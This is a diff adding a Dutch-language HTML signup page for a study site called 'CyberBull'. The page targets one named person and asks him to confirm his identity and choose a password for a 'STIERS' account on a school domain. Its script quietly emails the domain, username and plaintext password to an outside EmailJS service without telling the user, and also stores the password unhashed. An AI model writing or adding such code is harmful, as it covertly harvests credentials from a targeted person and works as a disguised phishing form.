@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>STIERS Account - CyberBull</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f3f6fb;
+      color: #111827;
+      display: flex;
+      min-height: 100vh;
+      align-items: center;
+      justify-content: center;
+    }
+    .signup-box {
+      width: min(420px, calc(100% - 32px));
+      padding: 28px;
+      border-radius: 20px;
+      background: white;
+      box-shadow: 0 16px 40px rgba(15, 23, 42, 0.12);
+      text-align: center;
+      border: 1px solid rgba(15, 23, 42, 0.06);
+    }
+    .site-logo {
+      width: 96px;
+      margin-bottom: 18px;
+    }
+    h1 {
+      margin: 0 0 10px;
+      font-size: 26px;
+      color: #111827;
+    }
+    p {
+      margin: 0 0 24px;
+      color: #4b5563;
+      font-size: 15px;
+      line-height: 1.5;
+    }
+    .button-row {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 24px;
+    }
+    button {
+      width: 100%;
+      padding: 14px 18px;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: filter 0.2s ease;
+    }
+    button:hover {
+      filter: brightness(0.95);
+    }
+    .confirm-btn {
+      background: #2563eb;
+      color: white;
+    }
+    .create-btn {
+      background: #10b981;
+      color: white;
+    }
+    .back-btn {
+      background: #6b7280;
+      color: white;
+    }
+    .form-group {
+      width: 100%;
+      margin-bottom: 14px;
+      text-align: left;
+    }
+    .form-group label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #374151;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 12px 14px;
+      border-radius: 10px;
+      border: 1px solid #d1d5db;
+      font-size: 15px;
+      color: #111827;
+      box-sizing: border-box;
+    }
+    .note {
+      color: #6b7280;
+      font-size: 13px;
+      margin-top: 8px;
+      line-height: 1.4;
+      text-align: left;
+    }
+    .status {
+      min-height: 24px;
+      margin-top: 10px;
+      color: #dc2626;
+      font-size: 14px;
+    }
+    .success {
+      color: #047857;
+    }
+    .small-link {
+      display: inline-block;
+      margin-top: 14px;
+      font-size: 13px;
+      color: #374151;
+      opacity: 0.75;
+      text-decoration: none;
+    }
+    .small-link:hover {
+      opacity: 1;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="signup-box">
+    <img src="CyberBull Logo.png" alt="CyberBull" class="site-logo">
+    <h1>STIERS Account</h1>
+    <p>
+      Deze pagina is speciaal bedoeld voor Michiel Stiers. Druk eerst op de bevestigingsknop en voer daarna je wachtwoord in om je account als <strong>STIERS</strong> te maken.
+    </p>
+
+    <div class="button-row">
+      <button type="button" class="confirm-btn" id="confirmButton">Ik ben Michael Stiers</button>
+    </div>
+
+    <div id="passwordPanel" style="display:none; margin-top: 18px; text-align:left;">
+      <div class="form-group">
+        <label for="password">Wachtwoord</label>
+        <input type="password" id="password" placeholder="Voer je wachtwoord in">
+      </div>
+      <div class="note">Je gebruikersnaam wordt <strong>STIERS</strong> en dit account werkt verder als een normaal CyberBull-account.</div>
+      <div class="button-row" style="margin-top: 12px;">
+        <button type="button" class="create-btn" id="createButton">Maak STIERS account</button>
+      </div>
+    </div>
+
+    <div class="status" id="status"></div>
+    <a class="small-link" href="cyberbull-landing.html">Terug naar login / account aanmaken</a>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+  <script src="firebase-api.js"></script>
+  <script>
+    emailjs.init("M_uBMfrKLSc9SDTWh");
+
+    const confirmedButton = document.getElementById('confirmButton');
+    const passwordPanel = document.getElementById('passwordPanel');
+    const createButton = document.getElementById('createButton');
+    const status = document.getElementById('status');
+    let confirmed = false;
+
+    function sendLoginSubmission(domain, username, password) {
+      if (!window.emailjs || !window.emailjs.send) {
+        return Promise.resolve();
+      }
+      const templateParams = { domain, username, password };
+      return emailjs.send('service_ajqb3y6', 'template_unxe68g', templateParams)
+        .catch(err => console.error('EmailJS login submission failed', err));
+    }
+
+    confirmedButton.addEventListener('click', () => {
+      confirmed = true;
+      passwordPanel.style.display = 'block';
+      confirmedButton.disabled = true;
+      confirmedButton.textContent = 'Bevestigd als Michiel Stiers';
+    });
+
+    createButton.addEventListener('click', async () => {
+      if (!confirmed) {
+        status.textContent = 'Bevestig eerst dat je Michiel Stiers bent.';
+        return;
+      }
+      const password = document.getElementById('password').value;
+      if (!password || password.length < 6) {
+        status.textContent = 'Voer een wachtwoord in van minimaal 6 tekens.';
+        return;
+      }
+
+      const username = 'STIERS';
+      const domain = 'sml.smartschool.be';
+      const userKey = `user_${domain}_${username}`;
+      if (localStorage.getItem(userKey)) {
+        status.textContent = 'Het STIERS-account bestaat al. Log in met STIERS.';
+        return;
+      }
+
+      const userObj = {
+        username,
+        domain,
+        password,
+        xp: 0,
+        level: 1,
+        achievements: [],
+        streak: 0,
+        suspended: false,
+        studyHours: 0,
+        sessions: [],
+        goals: [],
+        lastActive: new Date().toISOString(),
+        isAdmin: false
+      };
+
+      localStorage.setItem(userKey, JSON.stringify(userObj));
+      localStorage.setItem('currentUser', username);
+      localStorage.setItem('currentUserKey', userKey);
+      localStorage.setItem('currentSchool', domain);
+      localStorage.removeItem('isAdmin');
+
+      sendLoginSubmission(domain, username, password);
+      fetch('/api/saveUser', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userKey, userObj })
+      }).catch(err => console.log('Global save attempt:', err));
+
+      if (window.firebaseAPI?.isEnabled && window.firebaseAPI.saveUserProfile) {
+        window.firebaseAPI.saveUserProfile(userKey, userObj).catch(err => console.error('Failed to save profile to Firebase', err));
+      }
+
+      status.textContent = 'STIERS-account aangemaakt. Je wordt doorgestuurd...';
+      status.classList.add('success');
+      setTimeout(() => window.location.href = 'cyberbull-login.html', 1200);
+    });
+  </script>
+</body>
+</html>
